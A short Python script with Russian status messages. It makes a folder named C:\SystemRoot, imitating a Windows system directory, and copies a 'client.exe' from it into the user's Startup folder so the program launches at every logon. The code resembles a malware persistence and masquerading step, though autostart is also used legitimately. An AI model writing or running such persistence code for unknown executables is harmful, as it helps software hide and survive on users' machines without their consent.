import shutil
import os
os.makedirs("C:\SystemRoot", exist_ok=True)
source = r"C:\SystemRoot\client.exe"
startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
destination = os.path.join(startup_folder, "client.exe")

try:
    shutil.copyfile(source, destination)
    print(f"Файл успешно добавлен в автозагрузку: {destination}")
except Exception as e:
    print(f"Ошибка: {e}")